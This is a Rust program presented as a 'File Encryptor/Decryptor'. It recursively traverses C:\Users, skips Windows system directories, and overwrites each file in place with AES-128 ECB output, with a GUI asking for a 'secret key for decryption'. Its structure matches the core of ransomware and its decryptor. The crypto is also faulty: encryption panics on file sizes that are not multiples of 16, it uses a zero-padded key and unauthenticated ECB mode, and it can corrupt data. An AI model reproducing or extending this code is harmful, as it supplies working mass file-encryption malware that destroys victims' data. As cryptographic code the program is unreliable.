use aes::Aes128;
use aes::cipher::{BlockEncrypt, BlockDecrypt, KeyInit};
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::Path;
use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
use rayon::prelude::*;
use std::ffi::OsStr;
use eframe::egui;

#[derive(Default)]
struct TraversalStats {
    files_count: AtomicUsize,
    directories_count: AtomicUsize,
    permission_errors: AtomicUsize,
    other_errors: AtomicUsize,
    encryption_errors: AtomicUsize,
    decryption_errors: AtomicUsize,
}

struct MyApp {
    key: String,
}

impl Default for MyApp {
    fn default() -> Self {
        Self { key: String::new() }
    }
}

impl eframe::App for MyApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.label("Enter your secret key for decryption:");
            ui.text_edit_singleline(&mut self.key);

            if ui.button("Decrypt Files").clicked() {
                let key_bytes = self.prepare_key();
                let target_dir = Path::new("C:\\Users");
                let stats = Arc::new(TraversalStats::default());

                // Decrypt the files
                if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), &key_bytes, false) {
                    eprintln!("An error occurred during decryption: {}", e);
                }

                println!("Decryption completed.");
                println!("Files decrypted: {}", stats.files_count.load(Ordering::Relaxed));
            }
        });
    }
}

impl MyApp {
    fn prepare_key(&self) -> Vec<u8> {
        let mut key_bytes = self.key.trim().as_bytes().to_vec();
        if key_bytes.len() < 16 {
            key_bytes.resize(16, 0); // Pad with zeros if the key is too short
        } else if key_bytes.len() > 16 {
            key_bytes.truncate(16); // Truncate if the key is too long
        }
        key_bytes
    }
}

fn main() -> Result<(), eframe::Error> {
    let options = eframe::NativeOptions::default();
    eframe::run_native(
        "File Encryptor/Decryptor",
        options,
        Box::new(|_cc| Ok(Box::<MyApp>::default())),
    )
}

fn traverse_directory(dir: &Path, stats: Arc<TraversalStats>, key: &[u8], encrypt: bool) -> std::io::Result<()> {
    // Skip system directories like "C:\\Windows", "C:\\Program Files", etc.
    if should_skip_directory(dir) {
        println!("Skipping system directory: {}", dir.display());
        return Ok(());
    }

    let read_dir = match fs::read_dir(dir) {
        Ok(rd) => rd,
        Err(e) => {
            if e.kind() == std::io::ErrorKind::PermissionDenied {
                eprintln!("Permission denied: {}", dir.display());
                stats.permission_errors.fetch_add(1, Ordering::Relaxed);
            } else {
                eprintln!("Error accessing {}: {}", dir.display(), e);
                stats.other_errors.fetch_add(1, Ordering::Relaxed);
            }
            return Ok(());
        }
    };

    let entries: Vec<_> = read_dir.filter_map(Result::ok).collect();

    entries.par_iter().for_each(|entry| {
        let path = entry.path();

        if path.is_file() {
            if encrypt {
                match encrypt_file(&path, key) {
                    Ok(_) => stats.files_count.fetch_add(1, Ordering::Relaxed),
                    Err(e) => {
                        eprintln!("Error encrypting file {}: {}", path.display(), e);
                        stats.encryption_errors.fetch_add(1, Ordering::Relaxed)
                    },
                };
            } else {
                match decrypt_file(&path, key) {
                    Ok(_) => stats.files_count.fetch_add(1, Ordering::Relaxed),
                    Err(e) => {
                        eprintln!("Error decrypting file {}: {}", path.display(), e);
                        stats.decryption_errors.fetch_add(1, Ordering::Relaxed)
                    },
                };
            }
        } else if path.is_dir() {
            stats.directories_count.fetch_add(1, Ordering::Relaxed);
            if let Err(e) = traverse_directory(&path, Arc::clone(&stats), key, encrypt) {
                eprintln!("Error traversing directory {}: {}", path.display(), e);
                stats.other_errors.fetch_add(1, Ordering::Relaxed);
            }
        }
    });

    Ok(())
}

fn should_skip_directory(dir: &Path) -> bool {
    let system_dirs = vec![
        OsStr::new("Windows"),
        OsStr::new("Program Files"),
        OsStr::new("Program Files (x86)"),
        OsStr::new("System32"),
        OsStr::new("SysWOW64"),
        OsStr::new("WinSxS"),
        OsStr::new("System Volume Information"),
        OsStr::new("Recovery"),
        OsStr::new("CSC"),
        OsStr::new("INF"),
        OsStr::new("pagefile.sys"),
        OsStr::new("hiberfil.sys"),
        OsStr::new("swapfile.sys"),
    ];

    if let Some(dir_name) = dir.file_name() {
        return system_dirs.contains(&dir_name);
    }

    false
}

fn encrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    let cipher = Aes128::new_from_slice(key).unwrap(); 
    let mut buffer = vec![0u8; (contents.len() + 15) / 16 * 16];
    buffer.copy_from_slice(&contents);

    for block in buffer.chunks_mut(16) {
        cipher.encrypt_block(block.into());
    }

    let mut encrypted_file = File::create(path)?;
    encrypted_file.write_all(&buffer)?;

    Ok(())
}

fn decrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    let cipher = Aes128::new_from_slice(key).unwrap();
    let mut buffer = vec![0u8; contents.len()];

    for (i, block) in contents.chunks(16).enumerate() {
        let mut block_buf = [0u8; 16];
        block_buf.copy_from_slice(block);
        cipher.decrypt_block(&mut block_buf.into());
        buffer[i * 16..(i + 1) * 16].copy_from_slice(&block_buf);
    }

    let mut decrypted_file = File::create(path)?;
    decrypted_file.write_all(&buffer)?;

    Ok(())
}
